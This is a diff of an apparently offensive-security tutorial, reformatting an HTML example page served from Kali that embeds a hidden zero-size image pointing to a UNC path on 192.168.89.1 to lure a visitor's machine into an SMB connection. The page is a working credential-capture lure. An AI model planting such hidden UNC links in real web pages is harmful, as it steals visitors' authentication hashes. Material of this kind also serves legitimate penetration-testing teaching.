@@ -150,18 +150,16 @@ One way to coax a user into creating an SMB connection is to embed it in a websi
 
 First, create the website (we're using Kali for this) with the following content:
 
-
-```
+```html 
 <html>
-	<head>
-		<title>UNC Example</title>
-	</head>
-	<body>
-		<img src="file:////192.168.89.1/fake.jpg" width="0px" height="0px">
-	</body>
+  <head>
+    <title>UNC Example</title>
+  </head>
+  <body>
+    <img src="file:////192.168.89.1/fake.jpg" width="0px" height="0px">
+  </body>
 </html>
 ```
-
 
 This file, for the example is in `/var/www/html/unc.html`.
 
